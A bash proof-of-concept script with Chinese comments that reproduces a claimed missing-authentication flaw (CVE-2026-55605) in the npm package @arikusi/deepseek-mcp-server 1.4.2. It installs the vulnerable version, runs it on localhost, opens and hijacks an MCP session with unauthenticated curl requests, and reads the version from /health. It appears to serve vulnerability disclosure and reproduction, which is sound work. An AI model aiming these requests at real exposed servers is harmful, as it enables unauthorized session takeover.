#!/bin/bash
# PoC: CVE-2026-55605 @arikusi/deepseek-mcp-server v1.4.2 — 自托管 HTTP /mcp 无任何认证
# DNA: #龍芯⚡️2026-09-05-ISSUE1627-POC-RESPONSE-UID9622
# 创建者: 诸葛鑫（UID9622）· 归属名: 诸葛鑫 | UID9622 · 龍芯北辰
# License: MulanPSL v2
# 用法: bash security/poc/poc_55605_noauth.sh   (需 node ≥18 + npm; 需外网 registry.npmjs.org)
set -e
VULN="1.4.2"
WORK=$(mktemp -d)
echo "[1/4] 隔离目录安装漏洞版本 @arikusi/deepseek-mcp-server@$VULN ..."
cd "$WORK" && npm init -y >/dev/null 2>&1
printf 'proxy=\nhttps-proxy=\nregistry=https://registry.npmjs.org\n' > .npmrc
export NO_PROXY="*" HTTP_PROXY= HTTPS_PROXY= ALL_PROXY= http_proxy= https_proxy= all_proxy=
npm install --no-audit --no-fund "@arikusi/deepseek-mcp-server@$VULN" >/dev/null 2>&1
SRC="$WORK/node_modules/@arikusi/deepseek-mcp-server/dist"

cat > server.mjs <<MJS
process.env.DEEPSEEK_API_KEY = 'poc-dummy-key';
const { loadConfig } = await import('$SRC/config.js');
loadConfig();
const { createHttpApp } = await import('$SRC/transport-http.js');
const { createServer } = await import('$SRC/server.js');
const app = createHttpApp(createServer);
app.listen(34567, '127.0.0.1', () => console.error('[PoC] vulnerable server up'));
MJS

echo "[2/4] 启动 vulnerable server (127.0.0.1:34567) ..."
node server.mjs >server.log 2>&1 & SRV=$!
sleep 2.5
H="Content-Type: application/json"; A="Accept: application/json, text/event-stream"
INIT='{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"noauth","version":"1.0"}}}'

echo "[3/4] 证据A: 无任何认证头 POST /mcp initialize -> 应 200 且发放会话"
RESP=$(curl -s -i -X POST http://127.0.0.1:34567/mcp -H "$H" -H "$A" -d "$INIT")
echo "$RESP" | grep -iE "^HTTP/|mcp-session-id" || { echo "未复现"; kill $SRV 2>/dev/null; exit 1; }
SID=$(echo "$RESP" | grep -i "mcp-session-id" | tr -d '\r' | awk '{print $2}')

echo "[3/4] 证据B: 无认证凭会话 id 完成握手(接管该会话) -> 应 202"
curl -s -X POST http://127.0.0.1:34567/mcp -H "$H" -H "$A" -H "mcp-session-id: $SID" \
  -d '{"jsonrpc":"2.0","method":"notifications/initialized"}' -o /dev/null -w "  initialized: %{http_code}\n"

echo "[3/4] 证据C: /health 无认证泄露版本"
curl -s http://127.0.0.1:34567/health

echo ""
echo "[4/4] 清理"
kill $SRV 2>/dev/null; rm -rf "$WORK"
echo "✅ CVE-2026-55605 复现成功: 无认证 /mcp 可初始化会话并接管(未绑定调用者)"
